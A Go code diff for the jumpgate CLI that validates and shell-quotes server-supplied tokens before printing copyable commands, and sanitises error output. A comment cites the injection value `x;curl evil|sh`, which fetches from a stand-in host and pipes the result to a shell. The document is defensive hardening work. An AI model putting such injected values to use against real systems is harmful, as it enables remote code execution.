@@ -14,6 +14,8 @@ import (
 	"github.com/valve-tech/jumpgate/internal/api"
 	"github.com/valve-tech/jumpgate/internal/apiclient"
 	"github.com/valve-tech/jumpgate/internal/catalog"
+	"github.com/valve-tech/jumpgate/internal/executor"
+	"github.com/valve-tech/jumpgate/internal/jobs"
 	"github.com/valve-tech/jumpgate/internal/termsafe"
 )
 
@@ -78,6 +80,49 @@ func isJobsVerb(s string) bool { return s == "show" || s == "decide" || s == "ad
 // window or write the clipboard of the operator who reads it.
 func safe(s string) string { return termsafe.Line(s) }
 
+// A token a box supplied may enter a command line the operator is invited to
+// paste only if it has the shape the box's own rules give it. Control-byte
+// stripping is not enough: `x;curl evil|sh` has no control bytes.
+type tokenKind int
+
+const (
+	hostToken   tokenKind = iota // a target name; the rule the TUI's host form enforces
+	jobToken                     // a job id
+	choiceToken                  // a question or option id
+)
+
+func validToken(k tokenKind, s string) bool {
+	if k == jobToken {
+		return jobs.ValidID(s)
+	}
+	// Target names and question/option ids share the step-id shape.
+	return jobs.ValidStepID(s)
+}
+
+// suggestCommand is the one place a copyable `jumpgate …` line is built. It
+// returns ok=false, and no command, unless every box-supplied token matches
+// its pattern; each token is also shell-quoted, so a rule that is loosened
+// later still cannot turn a token into shell syntax.
+func suggestCommand(fixed []string, tokens ...struct {
+	kind tokenKind
+	text string
+}) (string, bool) {
+	argv := append([]string{"jumpgate"}, fixed...)
+	for _, t := range tokens {
+		if !validToken(t.kind, t.text) {
+			return "", false
+		}
+		argv = append(argv, t.text)
+	}
+	// QuoteArgv leaves argv[0] bare and single-quotes the rest.
+	return executor.QuoteArgv(argv), true
+}
+
+type tok = struct {
+	kind tokenKind
+	text string
+}
+
 // jobHost finds the box that runs job id, so `jobs output` takes only the id
 // `jumpgate jobs` prints (ruling P13). Ids are 64 random bits; an id on two
 // boxes is refused rather than guessed.
@@ -98,7 +143,7 @@ func jobHost(ctx context.Context, c *apiclient.Client, id string) (string, error
 	case 1:
 		return hosts[0], nil
 	}
-	return "", fmt.Errorf("job %s is on more than one box (%s); use `jumpgate jobs show HOST %s`", safe(id), safe(strings.Join(hosts, ", ")), safe(id))
+	return "", fmt.Errorf("job %s is on more than one box (%s); run `jumpgate jobs show` with the box you mean and this id", safe(id), safe(strings.Join(hosts, ", ")))
 }
 
 // followOutput prints a job's journal as it arrives, until the stream ends
@@ -149,7 +194,11 @@ func cmdMigrateNames(args []string) int {
 	return withClient(func(ctx context.Context, c *apiclient.Client) error {
 		v, err := c.MigrateNames(ctx, host)
 		if err == nil {
-			fmt.Printf("job %s started on %s; follow it with `jumpgate jobs %s` or the jobs inbox (5 in jumpgate)\n", safe(v.ID), safe(v.Target), safe(v.Target))
+			follow := "the jobs inbox (5 in jumpgate)"
+			if cmd, ok := suggestCommand([]string{"jobs"}, tok{hostToken, v.Target}); ok {
+				follow = "`" + cmd + "` or " + follow
+			}
+			fmt.Printf("job %s started on %s; follow it with %s\n", safe(v.ID), safe(v.Target), follow)
 		}
 		return err
 	})
@@ -161,7 +210,7 @@ func withClient(f func(ctx context.Context, c *apiclient.Client) error) int {
 	ctx := context.Background()
 	c, err := connect(ctx)
 	if err != nil {
-		return failed("%v", err)
+		return failed("%s", safe(err.Error()))
 	}
 	apiclient.WarnSkew(os.Stderr, c)
 	err = f(ctx, c)
@@ -172,7 +221,7 @@ func withClient(f func(ctx context.Context, c *apiclient.Client) error) int {
 		return reportServerErrorFrom(os.Stderr, "jobs", c.Info(), clean)
 	}
 	if err != nil {
-		return failed("%v", err)
+		return failed("%s", safe(err.Error()))
 	}
 	return 0
 }
@@ -195,12 +244,19 @@ func printInbox(w io.Writer, in api.JobsInbox, host string, now time.Time) {
 		}
 		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%d/%d\t%s\n", safe(j.Target), safe(j.ID), safe(j.Kind), safe(j.State), min(j.Step+1, len(j.Steps)), len(j.Steps), safe(lease))
 		if q := j.Question; q != nil {
+			fmt.Fprintf(tw, "\t? %s\n", safe(q.Prompt))
+			tokens := []tok{{hostToken, j.Target}, {jobToken, j.ID}, {choiceToken, q.ID}}
 			ids := make([]string, len(q.Options))
 			for i, o := range q.Options {
-				ids[i] = safe(o.ID)
+				tokens, ids[i] = append(tokens, tok{choiceToken, o.ID}), o.ID
 			}
-			fmt.Fprintf(tw, "\t? %s\n", safe(q.Prompt))
-			fmt.Fprintf(tw, "\t  jumpgate jobs decide %s %s %s %s\n", safe(j.Target), safe(j.ID), safe(q.ID), strings.Join(ids, "|"))
+			if cmd, ok := suggestCommand([]string{"jobs", "decide"}, tokens[:3]...); ok && validAll(tokens[3:]) {
+				// The options are alternatives, listed beside a placeholder: a `|` in
+				// a line meant for pasting would be a shell pipe.
+				fmt.Fprintf(tw, "\t  %s OPTION   (OPTION is one of: %s)\n", cmd, strings.Join(ids, ", "))
+			} else {
+				fmt.Fprintf(tw, "\t  this question cannot be shown as a command; decide it in the jobs inbox (5 in jumpgate)\n")
+			}
 		}
 	}
 	tw.Flush()
@@ -209,6 +265,15 @@ func printInbox(w io.Writer, in api.JobsInbox, host string, now time.Time) {
 			fmt.Fprintf(w, "%s: %s\n", safe(e.Target), safe(e.Error.Message))
 		}
 	}
+}
+
+func validAll(ts []tok) bool {
+	for _, t := range ts {
+		if !validToken(t.kind, t.text) {
+			return false
+		}
+	}
+	return true
 }
 
 // ago is a duration the way a person reads an age: 45s, 2m, 3h, 2d.
